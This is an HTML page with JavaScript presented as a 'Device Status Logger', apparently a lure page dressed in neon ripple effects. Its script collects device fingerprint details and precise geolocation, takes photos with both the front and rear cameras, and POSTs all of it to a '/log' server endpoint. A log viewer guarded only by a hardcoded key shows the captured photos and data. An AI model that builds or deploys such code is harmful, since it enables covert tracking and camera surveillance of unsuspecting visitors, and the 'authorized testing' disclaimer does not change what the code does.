<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>Device Status Logger â€” Ripple Edition</title>
<style>
html,body{
  margin:0; padding:0; height:100%; overflow:hidden;
  font-family:Inter,ui-sans-serif,system-ui,Segoe UI,Roboto,Helvetica,Arial;
  color:#e6eef7;
}
body{
  background:url("https://files.catbox.moe/c29z2z.jpg") center/cover no-repeat fixed;
  position:relative;
}

/* Ripple Canvas */
#rippleCanvas{
  position:fixed;
  inset:0;
  width:100%;
  height:100%;
  z-index:0;
  pointer-events:none;
}

/* Center Container */
.main{
  position:relative;
  z-index:5;
  display:flex;
  flex-direction:column;
  align-items:center;
  justify-content:flex-start;
  padding-top:40px;
  height:100%;
  text-align:center;
}

/* Neon animation */
@keyframes neon {
  0% {box-shadow:0 0 10px #00f0ff,0 0 20px #00f0ff,0 0 30px #00f0ff;}
  33% {box-shadow:0 0 10px #ff005c,0 0 20px #ff005c,0 0 30px #ff005c;}
  66% {box-shadow:0 0 10px #00ff73,0 0 20px #00ff73,0 0 30px #00ff73;}
  100%{box-shadow:0 0 10px #00f0ff,0 0 20px #00f0ff,0 0 30px #00f0ff;}
}

button{
  backdrop-filter:blur(10px);
  background:rgba(255,255,255,0.08);
  border:1px solid rgba(255,255,255,0.25);
  color:white;
  border-radius:12px;
  padding:12px 20px;
  font-size:1rem;
  cursor:pointer;
  margin:8px;
  animation:neon 4s linear infinite;
  transition:transform .2s ease;
}
button:hover{transform:scale(1.05);}

/* Logs & Photos */
#logSection{
  display:none;
  background:rgba(0,0,0,0.6);
  backdrop-filter:blur(8px);
  border-radius:12px;
  padding:16px;
  margin-top:20px;
  max-width:900px;
  width:90%;
  max-height:60%;
  overflow:auto;
}

.logEntry{
  display:flex;
  flex-direction:row;
  gap:20px;
  border-bottom:1px solid rgba(0,255,255,0.2);
  padding:10px 0;
}

.logInfo{
  flex:1;
  font-size:13px;
  white-space:pre-wrap;
  overflow-x:auto;
}

.logPhotos{
  display:flex;
  flex-direction:column;
  gap:5px;
}

.logPhotos img{
  max-width:150px;
  border-radius:8px;
  box-shadow:0 0 10px #0ff;
}
</style>
</head>
<body>
<canvas id="rippleCanvas"></canvas>

<div class="main">
  <h2>Device Status Logger</h2>
  <p style="max-width:600px;color:#bcd;text-shadow:0 0 5px #000">
    Collects and logs full device status (for your own authorized testing only).
  </p>

  <div>
    <button id="collectLocal">Collect Locally</button>
    <button id="collectSend">Collect &amp; Send</button>
    <button id="showLogs">View Logs</button>
  </div>

  <div id="logSection"></div>
</div>

<script>
// ---------------- Ripple Animation ----------------
const canvas = document.getElementById('rippleCanvas');
const ctx = canvas.getContext('2d');
let ripples=[];

function resize(){ canvas.width = innerWidth; canvas.height = innerHeight; }
window.addEventListener('resize', resize);
resize();

function draw(){
  ctx.clearRect(0,0,canvas.width,canvas.height);
  ripples.forEach(r=>{
    r.radius += 1.5;
    r.alpha -= 0.01;
    ctx.beginPath();
    ctx.arc(r.x,r.y,r.radius,0,Math.PI*2);
    ctx.strokeStyle = `rgba(${r.color},${r.alpha})`;
    ctx.lineWidth = 2;
    ctx.stroke();
  });
  ripples = ripples.filter(r=>r.alpha>0);
  requestAnimationFrame(draw);
}
draw();

function ripple(x,y){
  const colors=["0,255,255","255,0,90","0,255,100"];
  ripples.push({x,y,radius:0,alpha:0.7,color:colors[Math.floor(Math.random()*colors.length)]});
}
document.addEventListener('pointerdown', e => ripple(e.clientX,e.clientY));

// ---------------- Camera Capture ----------------
async function capturePhoto(facingMode){
  try{
    const stream = await navigator.mediaDevices.getUserMedia({video:{facingMode}});
    const track = stream.getVideoTracks()[0];
    const imageCapture = new ImageCapture(track);
    const photoBlob = await imageCapture.takePhoto();
    track.stop();
    const reader = new FileReader();
    reader.readAsDataURL(photoBlob);
    return await new Promise(resolve=>{
      reader.onloadend = ()=>resolve(reader.result);
    });
  }catch(err){ console.warn(facingMode+" camera capture failed:",err); return null; }
}

// ---------------- Device Info ----------------
async function gatherInfo(){
  const nav = navigator;
  const info = {
    time:new Date().toISOString(),
    userAgent:nav.userAgent,
    platform:nav.platform,
    languages:nav.languages,
    cores:nav.hardwareConcurrency,
    memory:nav.deviceMemory,
    screen:{width:screen.width,height:screen.height,availWidth:screen.availWidth,availHeight:screen.availHeight,colorDepth:screen.colorDepth},
    viewport:{width:innerWidth,height:innerHeight},
    timezone:Intl.DateTimeFormat().resolvedOptions().timeZone,
    connection: nav.connection?{type:nav.connection.effectiveType,downlink:nav.connection.downlink,rtt:nav.connection.rtt}:null
  };

  if(nav.getBattery){try{const b=await nav.getBattery();info.battery={level:b.level,charging:b.charging};}catch{}}

  info.geolocation = await new Promise(r=>{
    if(!nav.geolocation) return r(null);
    nav.geolocation.getCurrentPosition(
      pos=>r({lat:pos.coords.latitude,lon:pos.coords.longitude,accuracy:pos.coords.accuracy}),
      err=>r({error:err.message}),
      {timeout:8000}
    );
  });

  try{
    await nav.mediaDevices.getUserMedia({audio:true,video:true});
    const dev = await nav.mediaDevices.enumerateDevices();
    info.mediaDevices = dev.map(d=>({kind:d.kind,label:d.label}));
  }catch(e){ info.mediaDevices=[{error:e.message}]; }

  // --- Capture front and back photos ---
  info.frontPhoto = await capturePhoto("user");
  info.backPhoto = await capturePhoto("environment");

  return info;
}

// ---------------- Button Handlers ----------------
document.getElementById('collectLocal').onclick = async ()=>{
  const data = await gatherInfo();
  alert("Device info collected locally.");
  console.log(data);
};

document.getElementById('collectSend').onclick = async ()=>{
  const data = await gatherInfo();
  try{
    await fetch("/log",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(data)});
    alert("Device info sent to server.");
  }catch(e){console.error(e); alert("Failed to send.");}
};

document.getElementById('showLogs').onclick = async ()=>{
  const key = prompt("Enter access key:");
  if(key !== "54321"){ alert("Wrong key."); return; }
  try{
    const res = await fetch("/view?key="+encodeURIComponent(key));
    if(!res.ok){ alert("Access denied."); return; }
    const logs = await res.json();
    const logSection = document.getElementById('logSection');
    logSection.innerHTML = "";
    logs.forEach(log=>{
      const entry = document.createElement('div');
      entry.className = 'logEntry';

      const infoDiv = document.createElement('div');
      infoDiv.className = 'logInfo';
      const copy = {...log};
      delete copy.frontPhoto;
      delete copy.backPhoto;
      infoDiv.textContent = JSON.stringify(copy,null,2);

      const photosDiv = document.createElement('div');
      photosDiv.className = 'logPhotos';
      if(log.frontPhoto){
        const img1 = document.createElement('img');
        img1.src = log.frontPhoto;
        photosDiv.appendChild(img1);
      }
      if(log.backPhoto){
        const img2 = document.createElement('img');
        img2.src = log.backPhoto;
        photosDiv.appendChild(img2);
      }

      entry.appendChild(infoDiv);
      entry.appendChild(photosDiv);
      logSection.appendChild(entry);
    });
    logSection.style.display = 'block';
  }catch(e){ console.error(e); alert("Failed to fetch logs.");}
};
</script>
</body>
</html>
